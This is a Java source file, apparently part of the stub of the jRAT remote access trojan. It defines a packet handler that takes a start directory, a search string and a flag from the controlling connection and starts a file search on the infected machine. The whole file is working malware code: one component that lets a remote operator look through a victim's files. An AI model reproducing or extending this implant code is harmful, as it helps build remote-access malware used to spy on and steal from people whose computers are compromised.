package se.jrat.stub.packets.incoming;

import java.io.File;

import se.jrat.stub.Connection;
import se.jrat.stub.FileSearch;


public class Packet53StartSearch extends AbstractIncomingPacket {

	@Override
	public void read() throws Exception {
		String start = Connection.readLine();
		if (!start.endsWith(File.separator)) {
			start = start + File.separator;
		}
		String what = Connection.readLine();
		boolean dir = Connection.readBoolean();
		new FileSearch(start, what, dir).start();
	}

}
